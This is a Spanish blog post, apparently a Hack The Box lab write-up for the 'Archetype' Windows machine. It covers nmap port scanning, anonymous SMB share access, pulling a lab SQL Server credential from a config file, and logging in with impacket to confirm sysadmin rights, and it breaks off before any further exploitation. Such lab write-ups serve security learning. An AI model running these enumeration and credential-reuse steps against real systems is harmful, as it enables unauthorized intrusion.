<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="author" content="Penserbjorne" />

        <meta name="twitter:creator" content="@@_penserbjorne">
        <meta property="og:type" content="article" />
        <meta name="twitter:card" content="summary">

<meta name="keywords" content="cybersecurity, htb, pentest, writeup, htb, cybersecurity, htb, pentest, hacking, writeup, archetype" />

<meta property="og:title" content="Hack-The-Box (0002) &gt; Starting Point &gt; Archetype "/>
<meta property="og:url" content="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html" />
<meta property="og:description" content="Anotaciones sobre la máquina “Archetype” de la sección “Starting Point” de Hack-The-Box" />
<meta property="og:site_name" content="Blog de Penserbjorne" />
<meta property="og:article:author" content="Penserbjorne" />
<meta property="og:article:published_time" content="2020-08-07T00:00:00-05:00" />
<meta property="og:article:modified_time" content="2021-04-04T00:00:00-06:00" />
<meta name="twitter:title" content="Hack-The-Box (0002) &gt; Starting Point &gt; Archetype ">
<meta name="twitter:description" content="Anotaciones sobre la máquina “Archetype” de la sección “Starting Point” de Hack-The-Box">

        <title>Hack-The-Box (0002) &gt; Starting Point &gt; Archetype  · Blog de Penserbjorne
</title>
        <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/elegant.prod.css" media="screen">
        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/custom.css" media="screen">

        <link href="https://penserbjorne.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Blog de Penserbjorne - Full Atom Feed" />


    </head>
    <body>
        <div id="content">
            <div class="navbar navbar-static-top">
                <div class="navbar-inner">
                    <div class="container-fluid">
                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </a>
                        <a class="brand" href="https://penserbjorne.com/"><span class=site-name>Blog de Penserbjorne</span></a>
                        <div class="nav-collapse collapse">
                            <ul class="nav pull-right top-menu">
                                <li >
                                    <a href=
                                       https://penserbjorne.com
                                    >Home</a>
                                </li>
                                <li ><a href="https://penserbjorne.com/categories.html">Categories</a></li>
                                <li ><a href="https://penserbjorne.com/tags.html">Tags</a></li>
                                <li ><a href="https://penserbjorne.com/archives.html">Archives</a></li>
                                <li><form class="navbar-search" action="https://penserbjorne.com/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container-fluid">
                <div class="row-fluid">
                    <div class="span1"></div>
                    <div class="span10">
<article itemscope>
<div class="row-fluid">
    <header class="page-header span10 offset2">
        <h1>
            <a href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html">
                Hack-The-Box (0002) > Starting Point > Archetype
            </a>
        </h1>
    </header>
</div>

<div class="row-fluid">
        <div class="span8 offset2 article-content">
            
            <h2>Archetype</h2>
<p>Para comenzar con esta serie de anotaciones sobre la sección <em>Starting Point</em>
arrancaremos con la máquina <em>Archetype</em>. Si no sabes bien de que hablo te
recomiendo que primero leas la
<a href="{filename}./htb-01-starting-point-section.md">entrada anterior</a>.</p>
<ul>
<li><strong>Máquina:</strong>&nbsp;Archetype</li>
<li><strong><span class="caps">SO</span>:</strong>&nbsp;Windows</li>
<li><strong><span class="caps">IP</span>:</strong>&nbsp;10.10.10.27</li>
</ul>
<h2>Enumeration</h2>
<p>Como siempre digo: &#8220;<em>primero lo primero</em>&#8220;, pues vamos a comenzar a <strong>enumerar</strong>
lo que tiene el equipo objetivo, en este caso vamos a tratar de identificar
los puertos abiertos y el software asociado a&nbsp;estos.</p>
<p>Para esto utilizaremos la siempre poderosa herramienta de
<a href="https://es.wikipedia.org/wiki/Nmap">nmap</a>.</p>
<p>Lo primero que nos recomiendan utilizar son los siguientes dos&nbsp;comandos:</p>
<div class="highlight"><pre><span></span><code><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span>  -T4 <span class="m">10</span>.10.10.27 <span class="p">|</span> grep ^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
nmap -sC -sV -p<span class="nv">$ports</span> <span class="m">10</span>.10.10.27
</code></pre></div>


<p>Vamos a revisar la primera&nbsp;linea.</p>
<div class="highlight"><pre><span></span><code><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span>  -T4 <span class="m">10</span>.10.10.27 <span class="p">|</span> grep ^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
</code></pre></div>


<p>La linea anterior crea una variable en <code>bash</code> llamada <code>ports</code> en la cual se
almacena el resultado de
<code>nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//</code></p>
<p>El comando anterior se componen de la salida anidada entre varios comandos,
esto podemos observarlo con el uso de <code>comando1 | comando2</code>, el cual indica
que la salida del <code>comando1</code> será la entrada del <code>comando2</code>.</p>
<p>Separando el comando nos encontramos&nbsp;con:</p>
<ul>
<li><code>nmap -p- --min-rate=1000 -T4 10.10.10.27</code></li>
<li><code>grep ^[0-9]</code>:</li>
<li><code>cut -d '/' -f 1</code></li>
<li><code>tr '\n' ','</code></li>
<li><code>sed s/,$//</code></li>
</ul>
<p>Analicemos cada una de las&nbsp;partes.</p>
<p><code>nmap -p- --min-rate=1000 -T4 10.10.10.27</code> lo vamos a utilizar para detectar
los puertos abiertos en la máquina a trabajar. Esto se lo indicamos a <code>nmap</code>
con los siguientes&nbsp;parámetros:</p>
<ul>
<li><code>-p-</code>: Indicamos que vamos a escanear todos los puertos de la&nbsp;máquina.</li>
<li><code>--min-rate=1000</code>: Indicamos que enviaremos al menos 1000 paquetes por segundos para realizar el&nbsp;escaneo.</li>
<li><code>-T4</code>: Indicamos una <em>plantilla de tiempo</em>. Básicamente le decimos a <code>nmap</code>
que haga un <em>análisis agresivo</em>. El modo agresivo hace que los
análisis sean más rápidos al asumir que estas en una red razonablemente más
rápida y&nbsp;fiable.</li>
<li><code>10.10.10.27</code>: Indicamos la <span class="caps">IP</span> del objetivo, en este caso es la máquina con la que vamos a&nbsp;trabajar.</li>
</ul>
<p>La salida del comando anterior nos muestra la lista de puertos abiertos como
se ve a&nbsp;continuación.</p>
<div class="highlight"><pre><span></span><code>Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-08-06 <span class="m">21</span>:35 CDT
Warning: <span class="m">10</span>.10.10.27 giving up on port because retransmission cap hit <span class="o">(</span><span class="m">6</span><span class="o">)</span>.
Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.27
Host is up <span class="o">(</span><span class="m">0</span>.088s latency<span class="o">)</span>.
Not shown: <span class="m">63625</span> closed ports, <span class="m">1899</span> filtered ports
PORT      STATE SERVICE
<span class="m">135</span>/tcp   open  msrpc
<span class="m">139</span>/tcp   open  netbios-ssn
<span class="m">445</span>/tcp   open  microsoft-ds
<span class="m">1433</span>/tcp  open  ms-sql-s
<span class="m">5985</span>/tcp  open  wsman
<span class="m">47001</span>/tcp open  winrm
<span class="m">49664</span>/tcp open  unknown
<span class="m">49665</span>/tcp open  unknown
<span class="m">49666</span>/tcp open  unknown
<span class="m">49667</span>/tcp open  unknown
<span class="m">49668</span>/tcp open  unknown

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">121</span>.13 seconds
</code></pre></div>


<p>La salida anterior la pasamos a <code>grep ^[0-9]</code> para que nos muestre solamente
el listado de lineas donde aparecen puertos, esto para quitar la información
extra de <code>nmap</code>. Esto se lo indicamos a <code>grep</code> utilizando la expresión regular
<code>^[0-9]</code> la cual especifica que busque las lineas que comienzan con valores
numéricos que van del 0 al 9. La salida es como se muestra a&nbsp;continuación.</p>
<div class="highlight"><pre><span></span><code><span class="m">135</span>/tcp   open  msrpc
<span class="m">139</span>/tcp   open  netbios-ssn
<span class="m">445</span>/tcp   open  microsoft-ds
<span class="m">1433</span>/tcp  open  ms-sql-s
<span class="m">5985</span>/tcp  open  wsman
<span class="m">47001</span>/tcp open  winrm
<span class="m">49664</span>/tcp open  unknown
<span class="m">49665</span>/tcp open  unknown
<span class="m">49666</span>/tcp open  unknown
<span class="m">49667</span>/tcp open  unknown
<span class="m">49668</span>/tcp open  unknown
</code></pre></div>


<p>La salida anterior la pasamos a <code>cut -d '/' -f 1</code> para que extraiga
exclusivamente el número de los puertos abiertos. Esto se lo indicamos a <code>cut</code>
con los siguientes&nbsp;parámetros:</p>
<ul>
<li><code>-d '/'</code>: Indicamos el carácter delimitador. Esto vendría a ser nuestro
carácter para <em>separar</em> la cadena en <em>columna</em>, Algo así como la coma <code>,</code> de
un <span class="caps">CSV</span>.</li>
<li><code>-f 1</code>: Indicamos que retorne o imprima el primer campo de los resultados.
En este caso si observamos la salida del comando anterior podemos asumir que
las lineas de texto se van a separar en dos columnas debido a que cada linea
tiene el carácter <code>/</code>. El primer campo tendrá el número de puerto y el segundo
campo tendrá la descripción del&nbsp;puerto.</li>
</ul>
<p>La salida del comando anterior es la&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code><span class="m">135</span>
<span class="m">139</span>
<span class="m">445</span>
<span class="m">1433</span>
<span class="m">5985</span>
<span class="m">47001</span>
<span class="m">49664</span>
<span class="m">49665</span>
<span class="m">49666</span>
<span class="m">49667</span>
<span class="m">49668</span>
<span class="m">49669</span>
</code></pre></div>


<p>La salida anterior la pasamos a <code>tr '\n' ','</code> para eliminar los caracteres
<code>\n</code> y sustituirlos por una coma <code>,</code>. El resultado es el&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code><span class="m">135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,
</code></pre></div>


<p>La salida anterior la pasamos a <code>sed s/,$//</code> para simplemente extraer la
ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
Esto lo hacemos con la expresión <code>s/,$//</code> la cual se pasa a <code>sed</code> que respeta
la sintaxis <code>s/regexp/replacement/flags</code>. La expresión utilizada busca la
última coma de la linea y la&nbsp;borra.</p>
<p>La salida del comando anterior es la&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code><span class="m">135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669
</code></pre></div>


<p>Todo lo anterior es simplemente para entender el primer comando del
walk-through que básicamente nos arma una lista de puertos abiertos separados
por&nbsp;comas.</p>
<p>Esta lista de puertos quedo almacenada en la variable <code>ports</code> que vamos a
utilizar en el segundo comando&nbsp;recomendado:</p>
<div class="highlight"><pre><span></span><code>nmap -sC -sV -p<span class="nv">$ports</span> <span class="m">10</span>.10.10.27
</code></pre></div>


<p>El comando anterior realizará un escaneo en los puertos obtenidos del primer
comando. La bandera <code>-sV</code> indica a <code>nmap</code> que determine la versión del software
detectado en el puerto. La salida del comando&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-08-06 <span class="m">22</span>:36 CDT
Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.27
Host is up <span class="o">(</span><span class="m">0</span>.50s latency<span class="o">)</span>.

PORT      STATE SERVICE      VERSION
<span class="m">135</span>/tcp   open  msrpc        Microsoft Windows RPC
<span class="m">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
<span class="m">445</span>/tcp   open  microsoft-ds Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> microsoft-ds
<span class="m">1433</span>/tcp  open  ms-sql-s     Microsoft SQL Server <span class="m">2017</span> <span class="m">14</span>.00.1000.00<span class="p">;</span> RTM
<span class="p">|</span> ms-sql-ntlm-info:
<span class="p">|</span>   Target_Name: ARCHETYPE
<span class="p">|</span>   NetBIOS_Domain_Name: ARCHETYPE
<span class="p">|</span>   NetBIOS_Computer_Name: ARCHETYPE
<span class="p">|</span>   DNS_Domain_Name: Archetype
<span class="p">|</span>   DNS_Computer_Name: Archetype
<span class="p">|</span>_  Product_Version: <span class="m">10</span>.0.17763
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
<span class="p">|</span> Not valid before: <span class="m">2020</span>-08-06T09:11:31
<span class="p">|</span>_Not valid after:  <span class="m">2050</span>-08-06T09:11:31
<span class="p">|</span>_ssl-date: <span class="m">2020</span>-08-07T03:54:35+00:00<span class="p">;</span> +16m19s from scanner time.
<span class="m">5985</span>/tcp  open  http         Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
<span class="m">47001</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
<span class="m">49664</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="m">49665</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="m">49666</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="m">49667</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="m">49668</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="m">49669</span>/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server <span class="m">2008</span> R2 - <span class="m">2012</span><span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: mean: 1h40m18s, deviation: 3h07m51s, median: 16m17s
<span class="p">|</span> ms-sql-info:
<span class="p">|</span>   <span class="m">10</span>.10.10.27:1433:
<span class="p">|</span>     Version:
<span class="p">|</span>       name: Microsoft SQL Server <span class="m">2017</span> RTM
<span class="p">|</span>       number: <span class="m">14</span>.00.1000.00
<span class="p">|</span>       Product: Microsoft SQL Server <span class="m">2017</span>
<span class="p">|</span>       Service pack level: RTM
<span class="p">|</span>       Post-SP patches applied: <span class="nb">false</span>
<span class="p">|</span>_    TCP port: <span class="m">1433</span>
<span class="p">|</span> smb-os-discovery:
<span class="p">|</span>   OS: Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> <span class="o">(</span>Windows Server <span class="m">2019</span> Standard <span class="m">6</span>.3<span class="o">)</span>
<span class="p">|</span>   Computer name: Archetype
<span class="p">|</span>   NetBIOS computer name: ARCHETYPE<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>_  System time: <span class="m">2020</span>-08-06T20:54:29-07:00
<span class="p">|</span> smb-security-mode:
<span class="p">|</span>   account_used: guest
<span class="p">|</span>   authentication_level: user
<span class="p">|</span>   challenge_response: supported
<span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
<span class="p">|</span> smb2-security-mode:
<span class="p">|</span>   <span class="m">2</span>.02:
<span class="p">|</span>_    Message signing enabled but not required
<span class="p">|</span> smb2-time:
<span class="p">|</span>   date: <span class="m">2020</span>-08-07T03:54:26
<span class="p">|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">84</span>.18 seconds
</code></pre></div>


<p>Hasta este momento ya hemos logrado detectar los puertos abiertos así como el
software y las versiones que están asociados a&nbsp;estos.</p>
<p>Por ahora el post quedara hasta aquí &#8230; tengo hambre y necesito descansar un&nbsp;rato.</p>
<hr>
<p><strong>Continuación:&nbsp;2020-08-11</strong></p>
<p>Listo, ya he comido algo (y ya pasaron algunos días), así que podemos&nbsp;continuar.</p>
<p>Retomando, podemos observar que el puerto 445 y el 1433 se encuentran abiertos
y están asociados a dos servicios:
<a href="https://es.wikipedia.org/wiki/Server_Message_Block"><span class="caps">SMB</span></a> y
<a href="https://es.wikipedia.org/wiki/Microsoft_SQL_Server"><span class="caps">SQL</span> Server</a>.</p>
<p>Dado que el protocolo <code>SMB</code> se utiliza para compartir archivos podemos tratar de
conectarnos de manera anonima en busqueda de archivos interesantes. Para esto
recomiendan utilizar <code>smbclient</code> la cual es un cliente de conexiones
perteneciente al proyecto
<a href="https://es.wikipedia.org/wiki/Samba_(software)">Samba</a> en sistemas tipo <code>Unix</code>.</p>
<p>El comando recomendado&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>smbclient -N -L <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>
</code></pre></div>


<p>Los parámetros del comando anterior&nbsp;son:</p>
<ul>
<li><code>-N</code>: Conectar sin contraseña (de manera&nbsp;anónima).</li>
<li><code>-L</code>: Despliega los resultados en formato de&nbsp;lista.</li>
<li><code>\\\\10.10.10.27\\</code>: Estamos indicando la máquina a la cual nos vamos a
conectar. En este caso nos estamos conectando desde un sistema tipo <code>Unix</code> a un
sistema basado en <code>DOS</code> por lo cual utilizaremos la sintaxis de
<code>DOS</code> la cual requiere barras invertidas (<code>\</code>). Al estar en un sistema
tipo <code>Unix</code> tenemos que escapar la barra invertida con una barra invertida
(<code>\\\\</code>), por eso al inicio vemos cuatro barras invertidas y dos al final, en
realidad la sintaxis de <code>DOS</code> lo tomaría como dos barras al inicio y una al&nbsp;final.</li>
</ul>
<p>El resultado del comando anterior&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    backups         Disk      
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre></div>


<p>Revisando la salida del comando podemos observar que hay una carpeta interesante
llamada <code>backups</code> la cual podria contener información interesante. Procederemos
a conectarnos a esa carpeta con el comando&nbsp;recomendado:</p>
<div class="highlight"><pre><span></span><code>smbclient -N <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>backups
</code></pre></div>


<p>De igual manera que en el comando anterior, nos vamos a conectar sin contraseña
gracias al parámetro <code>-N</code> y hemos eliminado el parámetro <code>-L</code> ya que no queremos
ver una lista de resultados si no realizar una conexión&nbsp;directa.</p>
<p>Al conectarnos tendremos una terminal como la&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code>Try <span class="s2">&quot;help&quot;</span> to get a list of possible commands.
smb: \&gt;
</code></pre></div>


<p>En esta terminal podemos ejecutar comandos básicos, para ver un listado de
estos podemos utilizar <code>help</code> el cual nos desplegará una salida como la&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code>smb: \<span class="p">&gt;</span> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
<span class="k">rd</span>             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!  
</code></pre></div>


<p>Como el objetivo en este momento es encontrar información de utilidad se nos
recomienda utilizar el comando <code>dir</code> el cual permite listar el contenido de un
directorio en sistemas basados en <code>DOS</code>, este caso, el directorio&nbsp;actual.</p>
<div class="highlight"><pre><span></span><code>smb: \<span class="p">&gt;</span> dir
  .                                   D        0  Mon Jan 20 06:20:57 2020
  ..                                  D        0  Mon Jan 20 06:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020

        10328063 blocks of size 4096. 8243763 blocks available
</code></pre></div>


<p>Del contenido del directorio podemos observar que solamente existe el archivo
<code>prod.dtsConfig</code>.</p>
<p>Los archivos con extensión
<a href="https://abrirarchivos.info/extension/dtsconfig">.dtsConfig</a>
son archivos de configuración con sintaxis <code>XML</code> utilizados para aplicar
<em>valores de propiedad</em> a los paquetes de
<em>Servicios de Integración de <span class="caps">SQL</span> Server</em> (<code>SSIS</code>). Por lo cual podemos obtener
algo de información de este&nbsp;archivo.</p>
<p>Para ver el contenido del archivo nos recomiendan utilizar el siguiente&nbsp;comando:</p>
<div class="highlight"><pre><span></span><code>smb: \<span class="p">&gt;</span> get prod.dtsConfig
</code></pre></div>


<p>El comando anterior invoca a la herramienta <code>get</code> la cual se utiliza para
transferir archivos, por lo cual al ejecutarlo vamos a transferir una copia
del archivo <code>prod.dtsConfig</code> a nuestro equipo. Con el archivo en nuestro equipo
podemos ver su&nbsp;contenido.</p>
<p>De vuelta a nuestro equipo, podemos utilizar el comando <code>cat prod.dtsConfig</code> el
cual nos arrojara el contenido del&nbsp;archivo.</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;DTSConfiguration&gt;</span>
    <span class="nt">&lt;DTSConfigurationHeading&gt;</span>
        <span class="nt">&lt;DTSConfigurationFileInfo</span> <span class="na">GeneratedBy=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedFromPackageName=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedFromPackageID=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedDate=</span><span class="s">&quot;20.1.2019 10:01:34&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/DTSConfigurationHeading&gt;</span>
    <span class="nt">&lt;Configuration</span> <span class="na">ConfiguredType=</span><span class="s">&quot;Property&quot;</span> <span class="na">Path=</span><span class="s">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> <span class="na">ValueType=</span><span class="s">&quot;String&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;ConfiguredValue&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="nt">&lt;/ConfiguredValue&gt;</span>
    <span class="nt">&lt;/Configuration&gt;</span>
<span class="nt">&lt;/DTSConfiguration&gt;</span>
</code></pre></div>


<p>Del contenido del archivo anterior nos llaman la atención la siguiente&nbsp;línea:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;ConfiguredValue&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="nt">&lt;/ConfiguredValue&gt;</span>
</code></pre></div>


<p>La cadena anterior corresponde a la cadena para una conexión <code>SQL</code> asociada al
usuario <code>ARCHETYPE\sql_svc</code> (de <code>Windows</code>) y su contraseña que es <code>M3g4c0rp123</code>.</p>
<h2>Foothold</h2>
<p>Ya tenemos un usuario y contraseña, por lo que podemos intentar dar un primer
paso firme hacia nuestra máquina objetivo &#8230; peeeeero, eso será después porqué
en este momento necesito dejar el post pausado una vez más y conectarme a hacer
algunos pendientes del trabajo&nbsp;:)</p>
<hr>
<p><strong>Continuación:&nbsp;2020-11-06</strong></p>
<p>Ola k ase &#8230; bueno, ya pasaron casi tres meses de que comencé a escribir este
texto y pues apenas vamos a darle un cierre haha en realidad hubo muchas cosas
que se escribieron en este tiempo pero algunas las borre sin querer y otras
estan a medias esperando a ser publicada, en fin, continuemos con lo que toca&nbsp;aquí.</p>
<p>Bien, ya hemos obtenido un usuario y contraseña para una conexión de
<code>SQL Server</code> de un usuario de <code>Windows</code>, hay que tener en cuenta que aunque el
usuario es de <code>Windows</code> la configuración de permisos puede ser diferente dentro de
<code>SQL Server</code> que en <code>Windows</code></p>
<p>Para conectar a <code>SQL Server</code> podemos utilizar <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> el cual es una colección de clases en <code>Python</code> para
trabajar con protocolos de&nbsp;red.</p>
<p>Para obtener <code>impacket</code> necesitamos clonarlo de su repositorio de <code>GitHub</code> ya
que no viene instalado por defecto en nuestro sistema. Clonamos el&nbsp;repo.</p>
<div class="highlight"><pre><span></span><code>git clone https://github.com/SecureAuthCorp/impacket.git
</code></pre></div>


<p><code>impacket</code> cuenta con algunos scripts de ejemplo en la carpeta <code>/examples</code>, de
ahí podemos utilizar <code>mssqlclient.py</code> el cual sirve para realizar conexiones a
servidores de <code>SQL Server</code>.</p>
<p>El comando recomendado&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth<span class="sb">`</span>
</code></pre></div>


<p>Pero en nuestro caso utilizaremos el&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
</code></pre></div>


<p>Como podemos ver, hemos mandado <code>mssqlclient.py</code> directamente a la entrada de
<code>Python3</code>, y hemos indicado las&nbsp;banderas:</p>
<ul>
<li><code>ARCHETYPE/sql_svc</code>: es el&nbsp;usuario.</li>
<li><code>@10.10.10.27</code>: es el host o equipo a&nbsp;conectarnos.</li>
<li><code>-windows-auth</code>: indicamos que nos vamos a autenticar con las credenciales de <code>Windows</code>.</li>
</ul>
<p>Al introducir el comando nos va a solicitar la contraseña del usuario, la
obtuvimos anteriormente (<code>M3g4c0rp123</code>). Se realizará la conexión y se nos
habilitará una terminal de <code>SQL</code>.</p>
<div class="highlight"><pre><span></span><code>Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation

Password:
<span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: <span class="m">4096</span>, New Value: <span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line <span class="m">1</span>: Changed database context to <span class="s1">&#39;master&#39;</span>.
<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line <span class="m">1</span>: Changed language setting to us_english.
<span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> <span class="m">3232</span><span class="o">)</span>
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
SQL&gt;
</code></pre></div>


<p>Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
permisos de administrador. Para esto podemos utilizar la función
<a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15">IS_SRVROLEMEMBER</a>
la cual nos permite saber si un inicio de sesión de <code>SQL Server</code> es miembro
de un rol especifico del&nbsp;servidor.</p>
<p>La sintaxis de la función&nbsp;es:</p>
<div class="highlight"><pre><span></span><code><span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span> <span class="s1">&#39;role&#39;</span> <span class="p">[</span> <span class="p">,</span> <span class="s1">&#39;login&#39;</span> <span class="p">]</span> <span class="p">)</span>
</code></pre></div>


<p>En la cual tenemos dos&nbsp;argumentos:</p>
<ul>
<li><code>role</code>: indicamos el rol a revisar que puede ser alguno de los siguientes.<ul>
<li>sysadmin</li>
<li>serveradmin</li>
<li>dbcreator</li>
<li>setupadmin</li>
<li>bulkadmin</li>
<li>securityadmin</li>
<li>diskadmin</li>
<li>public</li>
<li>processadmin</li>
</ul>
</li>
<li><code>login</code>: es el nombre del servidor <code>SQL</code> a revisar, por defecto su valor es
    <code>NULL</code> y toma como referencia el servidor en el que hemos iniciado&nbsp;sesión.</li>
</ul>
<p>Explicado lo anterior, en nuestra sesión de <code>SQL Server</code> uitlizaremos el
siguiente&nbsp;comando:</p>
<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
</code></pre></div>


<p>Su salida&nbsp;es:</p>
<div class="highlight"><pre><span></span><code><span class="c1">-----------   </span>

          <span class="mi">1</span>
</code></pre></div>


<p>El cual nos da como salida un valor numérico de <code>1</code> el cual representa que el
la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
<code>sysadmin</code> en el <code>SQL Server</code>.</p>
<p>Como tenemos permisos de administrador podemos utilizar algunas herramientas de
